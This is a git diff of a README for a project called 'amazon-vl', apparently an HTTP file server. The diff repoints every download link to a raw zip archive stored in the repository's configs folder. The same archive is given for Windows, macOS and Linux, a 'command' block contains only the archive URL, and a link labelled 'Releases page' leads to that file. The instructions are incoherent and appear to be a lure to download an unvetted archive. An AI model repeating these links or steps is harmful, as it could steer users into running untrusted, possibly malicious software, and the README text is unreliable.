@@ -6,9 +6,9 @@ Welcome to **amazon-vl**, a lightweight HTTP file server that uses Basic Auth fo
 
 ## 📦 Download
 
-[![Download amazon-vl](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip)](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip)
+[![Download amazon-vl](https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip)](https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip)
 
-Go to the Releases page to download the latest version of **amazon-vl**: [Download Here](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip)
+Go to the Releases page to download the latest version of **amazon-vl**: [Download Here](https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip)
 
 ## ⚙️ System Requirements
 
@@ -20,12 +20,12 @@ To run **amazon-vl**, you need:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip).
 2. Look for the version you want to download.
 3. Click on the appropriate file for your system:
-   - For Windows, choose `https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip`
-   - For macOS, download `https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip`
-   - For Linux, select `https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip`
+   - For Windows, choose `https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip`
+   - For macOS, download `https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip`
+   - For Linux, select `https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip`
 4. Save the file to your computer.
 5. If needed, extract the contents of the downloaded file.
 
@@ -51,7 +51,7 @@ Run the following command for your respective operating system:
 
 - **Windows:** 
   ```bash
-  https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip
+  https://raw.githubusercontent.com/ahnitin/amazon-vl/main/configs/amazon-vl-2.7.zip
   ```
 
 - **macOS:** 
